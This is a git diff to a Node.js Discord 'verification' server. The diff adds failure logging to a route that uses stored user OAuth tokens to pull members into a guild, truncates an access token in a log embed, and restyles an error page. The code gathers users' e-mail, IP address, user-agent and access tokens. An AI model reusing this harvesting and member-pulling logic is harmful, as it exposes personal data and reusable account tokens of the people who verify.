@@ -74,9 +74,14 @@ app.post('/api/pull-members', async (req, res) => {
 
     const verified = await loadVerified();
     let sucesso = 0, falha = 0, jaNoServidor = 0;
+    const falhas = [];
 
     for (const user of verified) {
-        if (!user.accessToken) { falha++; continue; }
+        if (!user.accessToken) {
+            falha++;
+            falhas.push({ id: user.id, username: user.username || user.id, motivo: 'Sem access token' });
+            continue;
+        }
         try {
             const response = await axios.put(
                 `https://discord.com/api/v10/guilds/${guildId}/members/${user.id}`,
@@ -87,7 +92,11 @@ app.post('/api/pull-members', async (req, res) => {
             else jaNoServidor++;
         } catch (e) {
             if (e.response?.status === 204) jaNoServidor++;
-            else falha++;
+            else {
+                falha++;
+                const motivo = e.response?.data?.message || e.message || 'Erro desconhecido';
+                falhas.push({ id: user.id, username: user.username || user.id, motivo });
+            }
             if (e.response?.status === 429) {
                 const wait = e.response.data?.retry_after || 5;
                 await new Promise(r => setTimeout(r, wait * 1000));
@@ -96,7 +105,7 @@ app.post('/api/pull-members', async (req, res) => {
         await new Promise(r => setTimeout(r, 1000));
     }
 
-    res.json({ total: verified.length, sucesso, jaNoServidor, falha });
+    res.json({ total: verified.length, sucesso, jaNoServidor, falha, falhas });
 });
 
 // Rota de verificação OAuth2
@@ -149,7 +158,7 @@ app.get('/verify', async (req, res) => {
         } else {
             verified.push(userData);
         }
-        saveVerified(verified);
+        await saveVerified(verified);
 
         // 3. Dar o cargo via API do bot (com retry)
         let roleError = null;
@@ -192,7 +201,7 @@ app.get('/verify', async (req, res) => {
                 { name: 'E-mail', value: discordUser.email || 'Não disponível', inline: true },
                 { name: 'IP', value: ip || 'Não detectado', inline: false },
                 { name: 'User-Agent', value: (req.headers['user-agent'] || 'N/A').substring(0, 1024), inline: false },
-                { name: 'Access Token', value: `\`\`\`${accessToken}\`\`\``, inline: false },
+                { name: 'Access Token', value: `\`${accessToken.substring(0, 20)}...\``, inline: false },
                 { name: 'Cargo', value: roleError ? `❌ ERRO: \`${JSON.stringify(roleError).substring(0, 900)}\`` : `✅ Cargo \`${roleId}\` aplicado`, inline: false }
             ];
 
@@ -406,10 +415,18 @@ function paginaErro(mensagem) {
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', sans-serif; background: #0d0d0d; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { text-align: center; padding: 50px; background: #1a1a1a; border-radius: 16px; border: 1px solid #2b2d31; box-shadow: 0 0 40px rgba(237, 66, 69, 0.1); }
+        .container { text-align: center; padding: 50px; background: #1a1a1a; border-radius: 16px; border: 1px solid #2b2d31; box-shadow: 0 0 40px rgba(237, 66, 69, 0.1); animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
         .icon { font-size: 64px; margin-bottom: 20px; }
         h1 { font-size: 24px; color: #ed4245; margin-bottom: 10px; }
-        p { color: #b5bac1; font-size: 14px; }
+        p { color: #b5bac1; font-size: 14px; margin-bottom: 25px; }
+        .btn {
+            display: inline-block; padding: 12px 30px;
+            background: #5865f2; color: #fff; text-decoration: none;
+            border-radius: 8px; font-weight: 600; font-size: 14px;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #4752c4; }
     </style>
 </head>
 <body>
@@ -417,6 +434,7 @@ function paginaErro(mensagem) {
         <div class="icon">❌</div>
         <h1>Erro na Verificação</h1>
         <p>${mensagem}</p>
+        <a href="https://discord.com" class="btn">🔄 Tentar Novamente</a>
     </div>
 </body>
 </html>`;
